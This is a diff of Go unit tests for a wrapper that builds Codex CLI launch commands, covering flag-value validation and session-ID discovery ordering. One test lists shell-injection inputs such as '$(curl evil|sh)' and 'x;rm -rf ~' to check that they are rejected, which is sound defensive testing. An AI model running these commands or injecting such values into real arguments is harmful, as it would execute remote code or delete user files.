@@ -99,6 +99,39 @@ func TestCodexTool_BuildCommand_ModelAndEffort(t *testing.T) {
 		"BuildCommand(bypass, model+effort)")
 }
 
+// The launch argv is joined into a shell command string downstream, so model
+// and effort values must be single shell-safe tokens. Unsafe values are
+// rejected loudly at the CLI wiring (ValidateCodexFlagValue) and, fail-closed,
+// dropped by the setters — they must never reach the argv.
+func TestCodexTool_UnsafeFlagValuesNeverReachArgv(t *testing.T) {
+	for _, bad := range []string{
+		"gpt 5-codex",     // whitespace → argv splitting
+		"$(curl evil|sh)", // command substitution
+		"x;rm -rf ~",      // command separator
+		"'quoted'",        // quote-nesting breakage (tmux path)
+		"-mFlagLookalike", // leading dash could inject a flag
+	} {
+		c := NewCodex()
+		c.(ToolWithModel).SetModel(bad)
+		c.(ToolWithEffortLevel).SetEffortLevel(bad)
+		cmd := c.BuildCommand("id", false, "")
+		assertArgv(t, cmd, []string{"codex", "--dangerously-bypass-approvals-and-sandbox"},
+			"BuildCommand(unsafe value "+bad+")")
+
+		if err := ValidateCodexFlagValue("model", bad); err == nil {
+			t.Errorf("ValidateCodexFlagValue(%q) = nil, want error", bad)
+		}
+	}
+}
+
+func TestValidateCodexFlagValue_AcceptsRealisticValues(t *testing.T) {
+	for _, ok := range []string{"", "gpt-5-codex", "o4-mini", "openai/gpt-5.1", "high", "org:model@v2"} {
+		if err := ValidateCodexFlagValue("model", ok); err != nil {
+			t.Errorf("ValidateCodexFlagValue(%q) = %v, want nil", ok, err)
+		}
+	}
+}
+
 func TestCodexTool_BuildCommand_UnsetKnobsAddNoFlags(t *testing.T) {
 	c := NewCodex()
 	cmd := c.BuildCommand("id", false, "")
@@ -131,11 +164,11 @@ func TestCodexTool_DiscoverSessionID_NewestWins(t *testing.T) {
 	dir := t.TempDir()
 	base := time.Now().Add(-time.Hour)
 	writeRollout(t, dir, "2026/08/11", "rollout-2026-08-11T10-00-00-11111111-1111-4111-8111-111111111111.jsonl", base)
-	writeRollout(t, dir, "2026/08/12", "rollout-2026-08-12T09-30-00-22222222-2222-4222-8222-222222222222.jsonl", base.Add(time.Minute))
+	writeRollout(t, dir, "2026/08/12", "rollout-2026-08-12T09-30-00-22222222-2222-4222-8222-222222222222.jsonl", base)
 
 	got := c.DiscoverSessionID(dir)
 	if got != "22222222-2222-4222-8222-222222222222" {
-		t.Errorf("DiscoverSessionID() = %q, want newest session UUID", got)
+		t.Errorf("DiscoverSessionID() = %q, want newest (later-dated path) session UUID", got)
 	}
 }
 
@@ -162,16 +195,21 @@ func TestCodexTool_DiscoverSessionID_MissingDir(t *testing.T) {
 	}
 }
 
-func TestCodexTool_DiscoverSessionID_TieBreakOnPath(t *testing.T) {
+// Regression guard: discovery must be path-ordered, NOT mtime-ordered. The
+// saved state is round-tripped through `incus file pull`, which does not
+// preserve mtimes — after a save, mtimes reflect transfer order, so an
+// mtime-based pick would resume whichever file happened to be pulled last.
+func TestCodexTool_DiscoverSessionID_IgnoresMtime(t *testing.T) {
 	c := NewCodex()
 	dir := t.TempDir()
-	same := time.Now().Add(-time.Hour).Truncate(time.Second)
-	writeRollout(t, dir, "2026/08/11", "rollout-2026-08-11T10-00-00-55555555-5555-4555-8555-555555555555.jsonl", same)
-	writeRollout(t, dir, "2026/08/12", "rollout-2026-08-12T10-00-00-66666666-6666-4666-8666-666666666666.jsonl", same)
+	base := time.Now().Add(-time.Hour)
+	// The OLDER session (earlier date path) carries the NEWER mtime, simulating
+	// a pull that wrote it last. The later-dated path must still win.
+	writeRollout(t, dir, "2026/08/11", "rollout-2026-08-11T10-00-00-55555555-5555-4555-8555-555555555555.jsonl", base.Add(time.Minute))
+	writeRollout(t, dir, "2026/08/12", "rollout-2026-08-12T10-00-00-66666666-6666-4666-8666-666666666666.jsonl", base)
 
-	// Equal mtimes: the date-encoded layout makes the greater path the later session.
 	if got := c.DiscoverSessionID(dir); got != "66666666-6666-4666-8666-666666666666" {
-		t.Errorf("DiscoverSessionID(tie) = %q, want the lexicographically later session", got)
+		t.Errorf("DiscoverSessionID = %q, want the later-dated session regardless of mtimes", got)
 	}
 }
 
